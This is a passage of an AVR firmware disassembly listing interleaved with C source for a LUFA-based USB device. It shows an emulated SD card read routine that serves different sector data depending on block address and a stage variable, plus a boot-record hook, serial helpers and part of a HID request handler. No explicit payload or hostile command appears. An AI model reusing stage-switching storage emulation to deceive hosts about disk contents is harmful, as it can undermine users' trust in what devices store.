    5c0a:	d1 e0       	ldi	r29, 0x01	; 1
    5c0c:	1d c0       	rjmp	.+58     	; 0x5c48 <sdcard_ReadBlocks+0x366>
}


if (eppr_vars.curr_stage == STAG_2 && BlockAddress >= 384 && BlockAddress <= 12352)
{
    sec_ptr = b_0x64; k = 0; goto retsec;
    5c0e:	e1 2c       	mov	r14, r1
    5c10:	f1 2c       	mov	r15, r1
    5c12:	ca e6       	ldi	r28, 0x6A	; 106
    5c14:	d1 e0       	ldi	r29, 0x01	; 1
    5c16:	18 c0       	rjmp	.+48     	; 0x5c48 <sdcard_ReadBlocks+0x366>
    (BlockAddress >= 25 && BlockAddress <= 55) ||
    (BlockAddress >= 57 && BlockAddress <= 59) ||
    (BlockAddress >= 61 && BlockAddress <= 63)
)
{
    sec_ptr = b_0x00; k = 0; goto retsec;
    5c18:	e1 2c       	mov	r14, r1
    5c1a:	f1 2c       	mov	r15, r1
    5c1c:	c1 e6       	ldi	r28, 0x61	; 97
    5c1e:	d9 e0       	ldi	r29, 0x09	; 9
    5c20:	13 c0       	rjmp	.+38     	; 0x5c48 <sdcard_ReadBlocks+0x366>
    5c22:	e1 2c       	mov	r14, r1
    5c24:	f1 2c       	mov	r15, r1
    5c26:	c1 e6       	ldi	r28, 0x61	; 97
    5c28:	d9 e0       	ldi	r29, 0x09	; 9
    5c2a:	0e c0       	rjmp	.+28     	; 0x5c48 <sdcard_ReadBlocks+0x366>
    5c2c:	e1 2c       	mov	r14, r1
    5c2e:	f1 2c       	mov	r15, r1
    5c30:	c1 e6       	ldi	r28, 0x61	; 97
    5c32:	d9 e0       	ldi	r29, 0x09	; 9
    5c34:	09 c0       	rjmp	.+18     	; 0x5c48 <sdcard_ReadBlocks+0x366>
    5c36:	e1 2c       	mov	r14, r1
    5c38:	f1 2c       	mov	r15, r1
    5c3a:	c1 e6       	ldi	r28, 0x61	; 97
    5c3c:	d9 e0       	ldi	r29, 0x09	; 9
    5c3e:	04 c0       	rjmp	.+8      	; 0x5c48 <sdcard_ReadBlocks+0x366>
    5c40:	e1 2c       	mov	r14, r1
    5c42:	f1 2c       	mov	r15, r1
    5c44:	c1 e6       	ldi	r28, 0x61	; 97
    5c46:	d9 e0       	ldi	r29, 0x09	; 9

retsec:
        if (!bootscinit)
    5c48:	80 91 77 09 	lds	r24, 0x0977	; 0x800977 <bootscinit>
    5c4c:	81 11       	cpse	r24, r1
    5c4e:	35 c0       	rjmp	.+106    	; 0x5cba <sdcard_ReadBlocks+0x3d8>
        {
            bootscinit = true;
    5c50:	81 e0       	ldi	r24, 0x01	; 1
    5c52:	80 93 77 09 	sts	0x0977, r24	; 0x800977 <bootscinit>
            if (sec_ptr[0] == 0xEB && sec_ptr[1] == 0x3C && sec_ptr[2] == 0x90)
    5c56:	88 81       	ld	r24, Y
    5c58:	8b 3e       	cpi	r24, 0xEB	; 235
    5c5a:	79 f5       	brne	.+94     	; 0x5cba <sdcard_ReadBlocks+0x3d8>
    5c5c:	89 81       	ldd	r24, Y+1	; 0x01
    5c5e:	8c 33       	cpi	r24, 0x3C	; 60
    5c60:	61 f5       	brne	.+88     	; 0x5cba <sdcard_ReadBlocks+0x3d8>
    5c62:	8a 81       	ldd	r24, Y+2	; 0x02
    5c64:	80 39       	cpi	r24, 0x90	; 144
    5c66:	49 f5       	brne	.+82     	; 0x5cba <sdcard_ReadBlocks+0x3d8>
            {
                start_boot_sector = BlockAddress;
    5c68:	80 92 78 09 	sts	0x0978, r8	; 0x800978 <start_boot_sector>
    5c6c:	90 92 79 09 	sts	0x0979, r9	; 0x800979 <start_boot_sector+0x1>
    5c70:	a0 92 7a 09 	sts	0x097A, r10	; 0x80097a <start_boot_sector+0x2>
    5c74:	b0 92 7b 09 	sts	0x097B, r11	; 0x80097b <start_boot_sector+0x3>
                if (start_boot_sector != 0)
    5c78:	81 14       	cp	r8, r1
    5c7a:	91 04       	cpc	r9, r1
    5c7c:	a1 04       	cpc	r10, r1
    5c7e:	b1 04       	cpc	r11, r1
    5c80:	21 f0       	breq	.+8      	; 0x5c8a <sdcard_ReadBlocks+0x3a8>
                {
                    printf("\r\n\r\nERROR!! start_boot_sector is not zero!! your sd is BAD BURNED, always use /dev/sdd never with a number (bad /dev/sdd1)\r\n\r\n");
    5c82:	8e e6       	ldi	r24, 0x6E	; 110
    5c84:	98 e0       	ldi	r25, 0x08	; 8
    5c86:	0e 94 84 39 	call	0x7308	; 0x7308 <puts>
                }
                printf("boot sector BlockAddress: %li\r\n", BlockAddress);
    5c8a:	bf 92       	push	r11
    5c8c:	af 92       	push	r10
    5c8e:	9f 92       	push	r9
    5c90:	8f 92       	push	r8
    5c92:	8c ee       	ldi	r24, 0xEC	; 236
    5c94:	98 e0       	ldi	r25, 0x08	; 8
    5c96:	9f 93       	push	r25
    5c98:	8f 93       	push	r24
    5c9a:	0e 94 4a 39 	call	0x7294	; 0x7294 <printf>
                if (NULL != DREG_HOOK_BOOT_RECORD)
    5c9e:	e0 91 00 01 	lds	r30, 0x0100	; 0x800100 <__DATA_REGION_ORIGIN__>
    5ca2:	f0 91 01 01 	lds	r31, 0x0101	; 0x800101 <__DATA_REGION_ORIGIN__+0x1>
    5ca6:	0f 90       	pop	r0
    5ca8:	0f 90       	pop	r0
    5caa:	0f 90       	pop	r0
    5cac:	0f 90       	pop	r0
    5cae:	0f 90       	pop	r0
    5cb0:	0f 90       	pop	r0
    5cb2:	30 97       	sbiw	r30, 0x00	; 0
    5cb4:	11 f0       	breq	.+4      	; 0x5cba <sdcard_ReadBlocks+0x3d8>
                {
                    DREG_HOOK_BOOT_RECORD(sec_ptr);
    5cb6:	ce 01       	movw	r24, r28
    5cb8:	09 95       	icall
    5cba:	00 e0       	ldi	r16, 0x00	; 0
    5cbc:	10 e0       	ldi	r17, 0x00	; 0
    5cbe:	34 c0       	rjmp	.+104    	; 0x5d28 <sdcard_ReadBlocks+0x446>
			 *          on its direction.
			 */
			static inline bool Endpoint_IsReadWriteAllowed(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsReadWriteAllowed(void)
			{
				return ((UEINTX & (1 << RWAL)) ? true : false);
    5cc0:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
 */

static inline uint8_t sdcard_ReadBlockHandler(uint8_t* buffer, void* a, void* p)
{
    /* Check if the endpoint is currently full */
    if (!(Endpoint_IsReadWriteAllowed()))
    5cc4:	85 fd       	sbrc	r24, 5
    5cc6:	08 c0       	rjmp	.+16     	; 0x5cd8 <sdcard_ReadBlocks+0x3f6>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    5cc8:	e8 ee       	ldi	r30, 0xE8	; 232
    5cca:	f0 e0       	ldi	r31, 0x00	; 0
    5ccc:	80 81       	ld	r24, Z
    5cce:	8e 77       	andi	r24, 0x7E	; 126
    5cd0:	80 83       	st	Z, r24
    {
        /* Clear the endpoint bank to send its contents to the host */
        Endpoint_ClearIN();

        /* Wait until the endpoint is ready for more data */
        if (Endpoint_WaitUntilReady())
    5cd2:	c4 d6       	rcall	.+3464   	; 0x6a5c <Endpoint_WaitUntilReady>
    5cd4:	81 11       	cpse	r24, r1
    5cd6:	22 c0       	rjmp	.+68     	; 0x5d1c <sdcard_ReadBlocks+0x43a>
        {
            return 0;
        }
    }

    Endpoint_Write_8(buffer[0]);
    5cd8:	88 81       	ld	r24, Y
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    5cda:	e1 ef       	ldi	r30, 0xF1	; 241
    5cdc:	f0 e0       	ldi	r31, 0x00	; 0
    5cde:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[1]);
    5ce0:	89 81       	ldd	r24, Y+1	; 0x01
    5ce2:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[2]);
    5ce4:	8a 81       	ldd	r24, Y+2	; 0x02
    5ce6:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[3]);
    5ce8:	8b 81       	ldd	r24, Y+3	; 0x03
    5cea:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[4]);
    5cec:	8c 81       	ldd	r24, Y+4	; 0x04
    5cee:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[5]);
    5cf0:	8d 81       	ldd	r24, Y+5	; 0x05
    5cf2:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[6]);
    5cf4:	8e 81       	ldd	r24, Y+6	; 0x06
    5cf6:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[7]);
    5cf8:	8f 81       	ldd	r24, Y+7	; 0x07
    5cfa:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[8]);
    5cfc:	88 85       	ldd	r24, Y+8	; 0x08
    5cfe:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[9]);
    5d00:	89 85       	ldd	r24, Y+9	; 0x09
    5d02:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[10]);
    5d04:	8a 85       	ldd	r24, Y+10	; 0x0a
    5d06:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[11]);
    5d08:	8b 85       	ldd	r24, Y+11	; 0x0b
    5d0a:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[12]);
    5d0c:	8c 85       	ldd	r24, Y+12	; 0x0c
    5d0e:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[13]);
    5d10:	8d 85       	ldd	r24, Y+13	; 0x0d
    5d12:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[14]);
    5d14:	8e 85       	ldd	r24, Y+14	; 0x0e
    5d16:	80 83       	st	Z, r24
    Endpoint_Write_8(buffer[15]);
    5d18:	8f 85       	ldd	r24, Y+15	; 0x0f
    5d1a:	80 83       	st	Z, r24
#endif

        for (i = 0; i < 32; i++)
        {
            sdcard_ReadBlockHandler(sec_ptr, NULL, NULL);
            if (k)
    5d1c:	e1 14       	cp	r14, r1
    5d1e:	f1 04       	cpc	r15, r1
    5d20:	09 f0       	breq	.+2      	; 0x5d24 <sdcard_ReadBlocks+0x442>
            {
                sec_ptr += 16;
    5d22:	60 96       	adiw	r28, 0x10	; 16

            *sec_ptr = curit++;
        }
#endif

        for (i = 0; i < 32; i++)
    5d24:	0f 5f       	subi	r16, 0xFF	; 255
    5d26:	1f 4f       	sbci	r17, 0xFF	; 255
    5d28:	00 32       	cpi	r16, 0x20	; 32
    5d2a:	11 05       	cpc	r17, r1
    5d2c:	4c f2       	brlt	.-110    	; 0x5cc0 <sdcard_ReadBlocks+0x3de>
                sec_ptr += 16;
            }

        }
        /* Decrement the blocks remaining counter */
        BlockAddress++;
    5d2e:	8f ef       	ldi	r24, 0xFF	; 255
    5d30:	88 1a       	sub	r8, r24
    5d32:	98 0a       	sbc	r9, r24
    5d34:	a8 0a       	sbc	r10, r24
    5d36:	b8 0a       	sbc	r11, r24
        TotalBlocks--;
    5d38:	21 e0       	ldi	r18, 0x01	; 1
    5d3a:	c2 1a       	sub	r12, r18
    5d3c:	d1 08       	sbc	r13, r1
    if (Endpoint_WaitUntilReady())
    {
        return;
    }

    while (TotalBlocks)
    5d3e:	c1 14       	cp	r12, r1
    5d40:	d1 04       	cpc	r13, r1
    5d42:	09 f0       	breq	.+2      	; 0x5d46 <sdcard_ReadBlocks+0x464>
    5d44:	f8 cd       	rjmp	.-1040   	; 0x5936 <sdcard_ReadBlocks+0x54>
			 *          on its direction.
			 */
			static inline bool Endpoint_IsReadWriteAllowed(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsReadWriteAllowed(void)
			{
				return ((UEINTX & (1 << RWAL)) ? true : false);
    5d46:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
        BlockAddress++;
        TotalBlocks--;
    }

    /* If the endpoint is full, send its contents to the host */
    if (!(Endpoint_IsReadWriteAllowed()))
    5d4a:	85 fd       	sbrc	r24, 5
    5d4c:	05 c0       	rjmp	.+10     	; 0x5d58 <sdcard_ReadBlocks+0x476>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    5d4e:	e8 ee       	ldi	r30, 0xE8	; 232
    5d50:	f0 e0       	ldi	r31, 0x00	; 0
    5d52:	80 81       	ld	r24, Z
    5d54:	8e 77       	andi	r24, 0x7E	; 126
    5d56:	80 83       	st	Z, r24
    {
        Endpoint_ClearIN();
    }
}
    5d58:	df 91       	pop	r29
    5d5a:	cf 91       	pop	r28
    5d5c:	1f 91       	pop	r17
    5d5e:	0f 91       	pop	r16
    5d60:	ff 90       	pop	r15
    5d62:	ef 90       	pop	r14
    5d64:	df 90       	pop	r13
    5d66:	cf 90       	pop	r12
    5d68:	bf 90       	pop	r11
    5d6a:	af 90       	pop	r10
    5d6c:	9f 90       	pop	r9
    5d6e:	8f 90       	pop	r8
    5d70:	08 95       	ret

00005d72 <sdcard_CheckDataflashOperation>:
 *  \return Boolean true if all media chips are working, false otherwise
 */
bool sdcard_CheckDataflashOperation(void)
{
    return true;
}
    5d72:	81 e0       	ldi	r24, 0x01	; 1
    5d74:	08 95       	ret

00005d76 <Serial_putchar>:
	while ((CurrByte = pgm_read_byte(FlashStringPtr)) != 0x00)
	{
		Serial_SendByte(CurrByte);
		FlashStringPtr++;
	}
}
    5d76:	90 91 c8 00 	lds	r25, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
    5d7a:	95 ff       	sbrs	r25, 5
    5d7c:	fc cf       	rjmp	.-8      	; 0x5d76 <Serial_putchar>
    5d7e:	80 93 ce 00 	sts	0x00CE, r24	; 0x8000ce <__TEXT_REGION_LENGTH__+0x7e00ce>
    5d82:	80 e0       	ldi	r24, 0x00	; 0
    5d84:	90 e0       	ldi	r25, 0x00	; 0
    5d86:	08 95       	ret

00005d88 <Serial_getchar>:
    5d88:	80 91 c8 00 	lds	r24, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
    5d8c:	88 23       	and	r24, r24
    5d8e:	5c f4       	brge	.+22     	; 0x5da6 <Serial_getchar+0x1e>
    5d90:	80 91 c8 00 	lds	r24, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
    5d94:	88 23       	and	r24, r24
    5d96:	24 f4       	brge	.+8      	; 0x5da0 <Serial_getchar+0x18>
    5d98:	80 91 ce 00 	lds	r24, 0x00CE	; 0x8000ce <__TEXT_REGION_LENGTH__+0x7e00ce>
    5d9c:	90 e0       	ldi	r25, 0x00	; 0
    5d9e:	08 95       	ret
    5da0:	8f ef       	ldi	r24, 0xFF	; 255
    5da2:	9f ef       	ldi	r25, 0xFF	; 255
    5da4:	08 95       	ret
    5da6:	8e ef       	ldi	r24, 0xFE	; 254
    5da8:	9f ef       	ldi	r25, 0xFF	; 255
    5daa:	08 95       	ret

00005dac <Serial_SendString>:

void Serial_SendString(const char* StringPtr)
{
    5dac:	fc 01       	movw	r30, r24
	uint8_t CurrByte;

	while ((CurrByte = *StringPtr) != 0x00)
    5dae:	07 c0       	rjmp	.+14     	; 0x5dbe <Serial_SendString+0x12>
			 *  \return Boolean \c true if a character can be queued for transmission immediately, \c false otherwise.
			 */
			static inline bool Serial_IsSendReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Serial_IsSendReady(void)
			{
				return ((UCSR1A & (1 << UDRE1)) ? true : false);
    5db0:	90 91 c8 00 	lds	r25, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
			 *  \param[in] DataByte  Byte to transmit through the USART.
			 */
			static inline void Serial_SendByte(const char DataByte) ATTR_ALWAYS_INLINE;
			static inline void Serial_SendByte(const char DataByte)
			{
				while (!(Serial_IsSendReady()));
    5db4:	95 ff       	sbrs	r25, 5
    5db6:	fc cf       	rjmp	.-8      	; 0x5db0 <Serial_SendString+0x4>
				UDR1 = DataByte;
    5db8:	80 93 ce 00 	sts	0x00CE, r24	; 0x8000ce <__TEXT_REGION_LENGTH__+0x7e00ce>
	{
		Serial_SendByte(CurrByte);
		StringPtr++;
    5dbc:	31 96       	adiw	r30, 0x01	; 1

void Serial_SendString(const char* StringPtr)
{
	uint8_t CurrByte;

	while ((CurrByte = *StringPtr) != 0x00)
    5dbe:	80 81       	ld	r24, Z
    5dc0:	81 11       	cpse	r24, r1
    5dc2:	f6 cf       	rjmp	.-20     	; 0x5db0 <Serial_SendString+0x4>
	{
		Serial_SendByte(CurrByte);
		StringPtr++;
	}
}
    5dc4:	08 95       	ret

00005dc6 <Serial_SendData>:

void Serial_SendData(const void* Buffer,
                     uint16_t Length)
{
    5dc6:	fc 01       	movw	r30, r24
	uint8_t* CurrByte = (uint8_t*)Buffer;

	while (Length--)
    5dc8:	0c c0       	rjmp	.+24     	; 0x5de2 <Serial_SendData+0x1c>
	  Serial_SendByte(*(CurrByte++));
    5dca:	af 01       	movw	r20, r30
    5dcc:	4f 5f       	subi	r20, 0xFF	; 255
    5dce:	5f 4f       	sbci	r21, 0xFF	; 255
    5dd0:	90 81       	ld	r25, Z
			 *  \return Boolean \c true if a character can be queued for transmission immediately, \c false otherwise.
			 */
			static inline bool Serial_IsSendReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Serial_IsSendReady(void)
			{
				return ((UCSR1A & (1 << UDRE1)) ? true : false);
    5dd2:	80 91 c8 00 	lds	r24, 0x00C8	; 0x8000c8 <__TEXT_REGION_LENGTH__+0x7e00c8>
			 *  \param[in] DataByte  Byte to transmit through the USART.
			 */
			static inline void Serial_SendByte(const char DataByte) ATTR_ALWAYS_INLINE;
			static inline void Serial_SendByte(const char DataByte)
			{
				while (!(Serial_IsSendReady()));
    5dd6:	85 ff       	sbrs	r24, 5
    5dd8:	fc cf       	rjmp	.-8      	; 0x5dd2 <Serial_SendData+0xc>
				UDR1 = DataByte;
    5dda:	90 93 ce 00 	sts	0x00CE, r25	; 0x8000ce <__TEXT_REGION_LENGTH__+0x7e00ce>
void Serial_SendData(const void* Buffer,
                     uint16_t Length)
{
	uint8_t* CurrByte = (uint8_t*)Buffer;

	while (Length--)
    5dde:	b9 01       	movw	r22, r18
	  Serial_SendByte(*(CurrByte++));
    5de0:	fa 01       	movw	r30, r20
void Serial_SendData(const void* Buffer,
                     uint16_t Length)
{
	uint8_t* CurrByte = (uint8_t*)Buffer;

	while (Length--)
    5de2:	9b 01       	movw	r18, r22
    5de4:	21 50       	subi	r18, 0x01	; 1
    5de6:	31 09       	sbc	r19, r1
    5de8:	67 2b       	or	r22, r23
    5dea:	79 f7       	brne	.-34     	; 0x5dca <Serial_SendData+0x4>
	  Serial_SendByte(*(CurrByte++));
}
    5dec:	08 95       	ret

00005dee <Serial_CreateStream>:

void Serial_CreateStream(FILE* Stream)
{
    5dee:	fc 01       	movw	r30, r24
	if (!(Stream))
    5df0:	89 2b       	or	r24, r25
    5df2:	49 f4       	brne	.+18     	; 0x5e06 <Serial_CreateStream+0x18>
	{
		Stream = &USARTSerialStream;
		stdin  = Stream;
    5df4:	ec ef       	ldi	r30, 0xFC	; 252
    5df6:	fd e0       	ldi	r31, 0x0D	; 13
    5df8:	81 ee       	ldi	r24, 0xE1	; 225
    5dfa:	9d e0       	ldi	r25, 0x0D	; 13
    5dfc:	91 83       	std	Z+1, r25	; 0x01
    5dfe:	80 83       	st	Z, r24
		stdout = Stream;
    5e00:	93 83       	std	Z+3, r25	; 0x03
    5e02:	82 83       	std	Z+2, r24	; 0x02

void Serial_CreateStream(FILE* Stream)
{
	if (!(Stream))
	{
		Stream = &USARTSerialStream;
    5e04:	fc 01       	movw	r30, r24
		stdin  = Stream;
		stdout = Stream;
	}

	*Stream = (FILE)FDEV_SETUP_STREAM(Serial_putchar, Serial_getchar, _FDEV_SETUP_RW);
    5e06:	8e e0       	ldi	r24, 0x0E	; 14
    5e08:	df 01       	movw	r26, r30
    5e0a:	1d 92       	st	X+, r1
    5e0c:	8a 95       	dec	r24
    5e0e:	e9 f7       	brne	.-6      	; 0x5e0a <Serial_CreateStream+0x1c>
    5e10:	83 e0       	ldi	r24, 0x03	; 3
    5e12:	83 83       	std	Z+3, r24	; 0x03
    5e14:	8b eb       	ldi	r24, 0xBB	; 187
    5e16:	9e e2       	ldi	r25, 0x2E	; 46
    5e18:	91 87       	std	Z+9, r25	; 0x09
    5e1a:	80 87       	std	Z+8, r24	; 0x08
    5e1c:	84 ec       	ldi	r24, 0xC4	; 196
    5e1e:	9e e2       	ldi	r25, 0x2E	; 46
    5e20:	93 87       	std	Z+11, r25	; 0x0b
    5e22:	82 87       	std	Z+10, r24	; 0x0a
    5e24:	08 95       	ret

00005e26 <HID_Device_ProcessControlRequest>:
#define  __INCLUDE_FROM_HID_DRIVER
#define  __INCLUDE_FROM_HID_DEVICE_C
#include "HIDClassDevice.h"

void HID_Device_ProcessControlRequest(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
    5e26:	3f 92       	push	r3
    5e28:	4f 92       	push	r4
    5e2a:	5f 92       	push	r5
    5e2c:	6f 92       	push	r6
    5e2e:	7f 92       	push	r7
    5e30:	8f 92       	push	r8
    5e32:	9f 92       	push	r9
    5e34:	af 92       	push	r10
    5e36:	bf 92       	push	r11
    5e38:	cf 92       	push	r12
    5e3a:	df 92       	push	r13
    5e3c:	ef 92       	push	r14
    5e3e:	ff 92       	push	r15
    5e40:	0f 93       	push	r16
    5e42:	1f 93       	push	r17
    5e44:	cf 93       	push	r28
    5e46:	df 93       	push	r29
    5e48:	00 d0       	rcall	.+0      	; 0x5e4a <HID_Device_ProcessControlRequest+0x24>
    5e4a:	1f 92       	push	r1
    5e4c:	cd b7       	in	r28, 0x3d	; 61
    5e4e:	de b7       	in	r29, 0x3e	; 62
    5e50:	6c 01       	movw	r12, r24
				Endpoint_ClearStatusStage();
			}

			break;
	}
}
    5e52:	ed b6       	in	r14, 0x3d	; 61
    5e54:	fe b6       	in	r15, 0x3e	; 62
			 *  \return Boolean \c true if the selected endpoint has received a SETUP packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsSETUPReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsSETUPReceived(void)
			{
				return ((UEINTX & (1 << RXSTPI)) ? true : false);
    5e56:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
#define  __INCLUDE_FROM_HID_DEVICE_C
#include "HIDClassDevice.h"

void HID_Device_ProcessControlRequest(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo)
{
	if (!(Endpoint_IsSETUPReceived()))
    5e5a:	83 ff       	sbrs	r24, 3
    5e5c:	21 c1       	rjmp	.+578    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
	  return;

	if (USB_ControlRequest.wIndex != HIDInterfaceInfo->Config.InterfaceNumber)
    5e5e:	20 91 f8 0d 	lds	r18, 0x0DF8	; 0x800df8 <USB_ControlRequest+0x4>
    5e62:	30 91 f9 0d 	lds	r19, 0x0DF9	; 0x800df9 <USB_ControlRequest+0x5>
    5e66:	f6 01       	movw	r30, r12
    5e68:	80 81       	ld	r24, Z
    5e6a:	90 e0       	ldi	r25, 0x00	; 0
    5e6c:	28 17       	cp	r18, r24
    5e6e:	39 07       	cpc	r19, r25
    5e70:	09 f0       	breq	.+2      	; 0x5e74 <HID_Device_ProcessControlRequest+0x4e>
    5e72:	16 c1       	rjmp	.+556    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
	  return;

	switch (USB_ControlRequest.bRequest)
    5e74:	80 91 f5 0d 	lds	r24, 0x0DF5	; 0x800df5 <USB_ControlRequest+0x1>
    5e78:	83 30       	cpi	r24, 0x03	; 3
    5e7a:	09 f4       	brne	.+2      	; 0x5e7e <HID_Device_ProcessControlRequest+0x58>
    5e7c:	ac c0       	rjmp	.+344    	; 0x5fd6 <HID_Device_ProcessControlRequest+0x1b0>
    5e7e:	30 f4       	brcc	.+12     	; 0x5e8c <HID_Device_ProcessControlRequest+0x66>
    5e80:	81 30       	cpi	r24, 0x01	; 1
    5e82:	71 f0       	breq	.+28     	; 0x5ea0 <HID_Device_ProcessControlRequest+0x7a>
    5e84:	82 30       	cpi	r24, 0x02	; 2
    5e86:	09 f4       	brne	.+2      	; 0x5e8a <HID_Device_ProcessControlRequest+0x64>
    5e88:	ef c0       	rjmp	.+478    	; 0x6068 <HID_Device_ProcessControlRequest+0x242>
    5e8a:	0a c1       	rjmp	.+532    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
    5e8c:	8a 30       	cpi	r24, 0x0A	; 10
    5e8e:	09 f4       	brne	.+2      	; 0x5e92 <HID_Device_ProcessControlRequest+0x6c>
    5e90:	cf c0       	rjmp	.+414    	; 0x6030 <HID_Device_ProcessControlRequest+0x20a>
    5e92:	8b 30       	cpi	r24, 0x0B	; 11
    5e94:	09 f4       	brne	.+2      	; 0x5e98 <HID_Device_ProcessControlRequest+0x72>
    5e96:	b8 c0       	rjmp	.+368    	; 0x6008 <HID_Device_ProcessControlRequest+0x1e2>
    5e98:	89 30       	cpi	r24, 0x09	; 9
    5e9a:	09 f0       	breq	.+2      	; 0x5e9e <HID_Device_ProcessControlRequest+0x78>
    5e9c:	01 c1       	rjmp	.+514    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
    5e9e:	53 c0       	rjmp	.+166    	; 0x5f46 <HID_Device_ProcessControlRequest+0x120>
	{
		case HID_REQ_GetReport:
			if (USB_ControlRequest.bmRequestType == (REQDIR_DEVICETOHOST | REQTYPE_CLASS | REQREC_INTERFACE))
    5ea0:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    5ea4:	81 3a       	cpi	r24, 0xA1	; 161
    5ea6:	09 f0       	breq	.+2      	; 0x5eaa <HID_Device_ProcessControlRequest+0x84>
    5ea8:	fb c0       	rjmp	.+502    	; 0x60a0 <HID_Device_ProcessControlRequest+0x27a>
			{
    5eaa:	ad b6       	in	r10, 0x3d	; 61
    5eac:	be b6       	in	r11, 0x3e	; 62
				uint16_t ReportSize = 0;
    5eae:	1a 82       	std	Y+2, r1	; 0x02
    5eb0:	19 82       	std	Y+1, r1	; 0x01
				uint8_t  ReportID   = (USB_ControlRequest.wValue & 0xFF);
    5eb2:	e4 ef       	ldi	r30, 0xF4	; 244
    5eb4:	fd e0       	ldi	r31, 0x0D	; 13
    5eb6:	82 81       	ldd	r24, Z+2	; 0x02
    5eb8:	73 80       	ldd	r7, Z+3	; 0x03
    5eba:	8b 83       	std	Y+3, r24	; 0x03
				uint8_t  ReportType = (USB_ControlRequest.wValue >> 8) - 1;
    5ebc:	7a 94       	dec	r7
				uint8_t  ReportData[HIDInterfaceInfo->Config.PrevReportINBufferSize];
    5ebe:	f6 01       	movw	r30, r12
    5ec0:	40 85       	ldd	r20, Z+8	; 0x08
    5ec2:	50 e0       	ldi	r21, 0x00	; 0
    5ec4:	8d b7       	in	r24, 0x3d	; 61
    5ec6:	9e b7       	in	r25, 0x3e	; 62
    5ec8:	84 1b       	sub	r24, r20
    5eca:	95 0b       	sbc	r25, r21
    5ecc:	0f b6       	in	r0, 0x3f	; 63
    5ece:	f8 94       	cli
    5ed0:	9e bf       	out	0x3e, r25	; 62
    5ed2:	0f be       	out	0x3f, r0	; 63
    5ed4:	8d bf       	out	0x3d, r24	; 61
    5ed6:	ed b7       	in	r30, 0x3d	; 61
    5ed8:	fe b7       	in	r31, 0x3e	; 62
    5eda:	31 96       	adiw	r30, 0x01	; 1
    5edc:	4f 01       	movw	r8, r30

				memset(ReportData, 0, sizeof(ReportData));
    5ede:	60 e0       	ldi	r22, 0x00	; 0
    5ee0:	70 e0       	ldi	r23, 0x00	; 0
    5ee2:	cf 01       	movw	r24, r30
    5ee4:	0e 94 15 39 	call	0x722a	; 0x722a <memset>

				CALLBACK_HID_Device_CreateHIDReport(HIDInterfaceInfo, &ReportID, ReportType, ReportData, &ReportSize);
    5ee8:	8e 01       	movw	r16, r28
    5eea:	0f 5f       	subi	r16, 0xFF	; 255
    5eec:	1f 4f       	sbci	r17, 0xFF	; 255
    5eee:	94 01       	movw	r18, r8
    5ef0:	47 2d       	mov	r20, r7
    5ef2:	be 01       	movw	r22, r28
    5ef4:	6d 5f       	subi	r22, 0xFD	; 253
    5ef6:	7f 4f       	sbci	r23, 0xFF	; 255
    5ef8:	c6 01       	movw	r24, r12
    5efa:	0e 94 5c 1d 	call	0x3ab8	; 0x3ab8 <CALLBACK_HID_Device_CreateHIDReport>

				if (HIDInterfaceInfo->Config.PrevReportINBuffer != NULL)
    5efe:	f6 01       	movw	r30, r12
    5f00:	86 81       	ldd	r24, Z+6	; 0x06
    5f02:	97 81       	ldd	r25, Z+7	; 0x07
    5f04:	00 97       	sbiw	r24, 0x00	; 0
    5f06:	29 f0       	breq	.+10     	; 0x5f12 <HID_Device_ProcessControlRequest+0xec>
				{
					memcpy(HIDInterfaceInfo->Config.PrevReportINBuffer, ReportData,
					       HIDInterfaceInfo->Config.PrevReportINBufferSize);
